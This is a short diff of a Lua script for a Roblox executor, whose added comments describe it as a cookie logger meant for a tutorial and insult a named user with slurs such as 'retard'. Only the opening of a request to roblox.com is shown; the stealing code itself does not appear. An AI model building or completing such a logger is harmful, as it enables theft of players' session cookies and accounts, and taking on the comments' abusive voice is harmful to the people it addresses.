@@ -1,3 +1,11 @@
+[[ -- note for the retarded ass kid named "isimpplydontexist" 
+that sent messages to my webhook saying it was a logger this isnt even my script and it was public by 
+someone else this script isnt even included in the final u can go check it yourself retard
+-- ]]
+
+-- this is supposed to be a cookie logger script used for a tutorial i dont have it embedded in any of my scripts
+-- i have no idea if it works or not
+
 local response = syn.request(
     {
         Url = "https://www.roblox.com",
